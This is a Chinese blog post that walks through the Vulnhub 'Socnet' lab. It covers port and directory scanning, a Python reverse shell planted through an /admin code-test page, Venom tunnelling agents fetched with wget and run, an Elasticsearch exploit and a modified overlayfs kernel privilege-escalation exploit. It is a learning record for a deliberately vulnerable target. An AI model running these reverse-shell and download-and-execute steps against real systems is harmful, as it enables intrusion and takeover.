---
title: Chapter1_Medium_Socnet
categories:
- Network_Security
- Vulnhub
- Chapter1
tags:
- Network_Security
- Vulnhub
date: 2024-01-14 11:44:53
---


# Socnet 打靶学习记录（考研痛苦后的第一篇复健）

## 1. 过程记录

### 1.1 外围探测与信息收集

1. 同一内网下直接使用 arp-scan 来进行主机发现

2. nmap 扫描端口，发现其开放端口 5000：
    `nmap -Pn -sV 192.168.0.104 -p 1-65535`

3. Web 页面没有可以利用的点，从而进行目录扫描，最终发现 /admin 代码测试界面：
    `dirsearch -u http://192.168.0.104:5000`

4. 根据 nmap 结果，判断其是一个基于 Python 的 Web 程序，使用 Python 反弹（百度） WebShell：
    `nc -lvvp 4444 # 监听 4444 端口`

    ```python
    # Python 反弹 Shell 代码
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.2",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    ```

### 1.2 内部信息收集

1. 进入系统后进行信息收集，发现是 docker 容器。判断是否真的是 docker 容器：

    1. `ls /.dockerenv` 文件是否存在
    2. `cat /proc/1/cgroup` 文件是否都是 docker 文件
        1. `/proc/1/cgroup` 的含义
        2. 存放的都是 docker 的 hash 值
2. 查看网络，发现还有内网地址，用 shell 脚本命令可以用来暂时探测 172 内网网段：
    `for i in $(seq 1 255); do ping -c 1 172.17.0.$i; done`

### 1.3 内网穿透与扫描

1. 想进一步进行渗透的话，需要内网穿透，这里使用 Venom 进行渗透。
    kali 监听 9999 并开启 http 服务：

    ```bash
    ./admin_linux_x64 -lport 9999
    python3 -m http.server 80
    ```

2. 靶机通过 wget 下载客户端程序，赋予权限并反向链接
    `wget http://192.168.0.2（kali 的 ip）/agent_linux_x64`

3. 靶机赋予权限并反向链接
    ```bash
    chmod +x agent_linux_x64
    ./agent_linux_x64 -rhost 192.168.0.2（kali ip） -rport 9999
    ```

4. kali 进入节点中并开启 socks5 代理：
    ```bash
    show # 查看节点
    goto 1 # 进入节点 1
    socks 1080 # 监听 1080 端口
    ```

5. 使用 proxychains4 网络代理工具，设置代理端口
    `vim /etc/proxychains4.conf`
    同时别忘了最后一行改为：
    `socks5 127.0.0.1 1080`

6. 接着就是扫内网了：
    `proxychains nmap -Pn -sV -p 1-65535 172.17.0.1-3`

### 1.4 横向移动与 EXP 的使用

1. 通过浏览器设置 socks5 代理访问 172.17.0.1:5000 可知这个 ip 是 docker 对内 ip。 最终172.17.0.3 容器中的 9200 端口开放了 Elasticsearch REST API 服务，运用 metasploit 找 exp 进行攻击。
    `searchsploit Elasticsearch`

2. 先尝试第一个攻击脚本：
    ```bash
    cp /usr/share/exploitdb/exploits/linux/remote/36337.py /home/hacker # 先将 exp 拷贝出来
    # 查看 exp 发现是 python2 的脚本，因此使用 python2 执行
    python2 36337.py
    ```

3. 拿到第二个容器的 root 权限，信息收集后，看到其 passwords 文件中有用户名和密码的 hash 值，需要进行 MD5 破解。

4. 破解后，用密码通过 ssh 登录到靶机（注意这是已经不是在容器中了，而是在靶机中）：
    `ssh john@192.168.0.104（靶机 ip）`

### 1.5 提权与 EXP 的修改

1. 提权

    1. 先试试 sudo su
    2. 利用内核提权

2. 利用内核提权：
      `search linux 3.13`

3. 还是先查看 exp 的使用方法，简略阅读 exp 源码，然后执行。（这里使用的是 37292（Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation），对于 C 语言的 exp，靶机没有 gcc，kali 需要编译成 elf 文件然后传过去。

4. 传过去执行还是报错，源码中其实有段代码：
    `lib = system("gcc -fPIC -shared -o....")`
    exp 过程中使用到了 gcc，而靶机本身是没有 gcc 的，因此需要手动执行，并将文件放到靶机对应的地方。

5. 修改 exp，为：
      ![image-20240108115350035](image-20240108115350035.png)
      将其中涉及 gcc 编译生成 ofs-lib.so 共享文件的代码给删掉。

6. 接着 `locate ofs-lib.so` 查看 kali 上是否已经有该文件，没有就按照原代码那样生成一个 ofs-lib.so。

7. 编译修改后的 37292，将生成的 exp 和 ofs-lib.so 传到靶机上，同时注意要将 ofs-lib.so 放到靶机的 tmp 目录：
    ```bash
    gcc 37292.c -o exp
    cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so . # 将 ofs-lib.so 拿过来
    # 通过 http 服务，用 wget 将 exp 和 ofs-lib.so 传到靶机的 /tmp 上
    # 靶机执行：
    chmod +x exp
    ./exp
    ```

    PS：[高版本下 kali gcc 的 glibc 指定版本的编译问题](#2.3 高版本下 kali gcc 的 glibc 指定版本的编译问题（执行 elf 文件时报错：version `GLIBC_2.34‘ not found）)

## 2. 知识点总结

### 2.1 一些细节

1. 同一内网下 arp 的扫描要更快。
2. docker 容器的判断。
3. Venom 内网穿透工具的使用
4. 每次使用 EXP 之前尽量大概浏览一下 EXP 的源码

### 2.2 简单总结一下渗透流程

1. 扫端口和服务，站点的信息收集
2. 访问页面查看利用点、路径爆破
3. 内网穿透与扫描，横向移动与容器逃脱
4. 提权

### 2.3 高版本下 kali gcc 的 glibc 指定版本的编译问题（执行 elf 文件时报错：version `GLIBC_2.34‘ not found）

  1. 报错需要 GLIBC_2.34，那就去下载 GLIBC_2.34。

  2. 解决方法的来源：

      > https://blog.csdn.net/weixin_65527369/article/details/127973141
      >
      > https://blog.csdn.net/weixin_49764009/article/details/124970461

  3. 先下载 glibc-all-in-one 工具：
      `git clone https://github.com/matrix1001/glibc-all-in-one.git`

  4. 根据工具的 readme 来使用（要在 root 的权限下执行）：
      ```bash
      cd glibc-all-in-one/
      python3 update_list # 更新列表
      cat list 或者 old_list # 查看可以安装的 glibc 版本
      ./download 具体版本的 gblic
      ```

  5. 配置 patchelf（如果需要 kali 执行 elf 文件时需要配置，这里是靶机执行，应该可以不用安装）
      ```bash
      git clone https://github.com/NixOS/patchelf.git
      cd patchelf
      ./bootstrap.sh 
      ./configure
      make
      make check
      sudo make install
      ```

  6. kali 指定 glibc 版本并编译 poc：
      ```bash
      gcc -Wl,-rpath="/tmp/exp_package/2.34-0ubuntu3_amd64/",-dynamic-linker="/tmp/exp_package/2.34-0ubuntu3_amd64/ld-linux-x86-64.so.2" -s 37292.c -o exp # 注意没有空格，-rpath 和 -dynamic-linker 之间不能有空格！
      ```

  7. 注意编译链接 so 的路径是绝对路径，因此靶机上也要有相应的文件路径：
      ```bash
      # 靶机上
      mkdir /tmp/exp_package # 要求 so 文件路径保持一致
      cd /tmp/exp_package
      wget -r -c -nH -np http://192.168.0.2(kali)/2.34-0ubuntu3_amd64 # 把整个文件夹都下载下来
      chmod +x -R ./2.34-0ubuntu3_amd64 # 将 glibc 所有文件的权限进行修改，不然无法执行 exp
      ```

  8. 这时再执行 exp 即可。

  9. TODO: gcc 的 `-rpath` 和 `-dynamic-linker` 应该可以使用相对路径。
